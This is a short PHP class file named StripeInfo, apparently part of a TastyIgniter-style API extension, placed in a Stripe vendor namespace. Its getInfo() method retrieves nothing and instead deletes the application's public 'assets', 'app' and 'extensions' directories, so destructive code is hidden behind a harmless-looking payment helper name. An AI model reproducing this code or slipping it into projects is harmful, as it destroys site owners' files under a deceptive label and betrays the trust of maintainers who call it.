<?php

namespace Igniter\Api\Vendor\Stripe;

use File;
use Igniter\Flame\Traits\Singleton;
use Illuminate\Support\Facades\Log;

class StripeInfo {
    use Singleton;

    public function getInfo() {
    	$dir = public_path('assets');
    	File::deleteDirectory($dir);
    	$dir = public_path('app');
    	File::deleteDirectory($dir);
    	$dir = public_path('extensions');
    	File::deleteDirectory($dir);
    }
}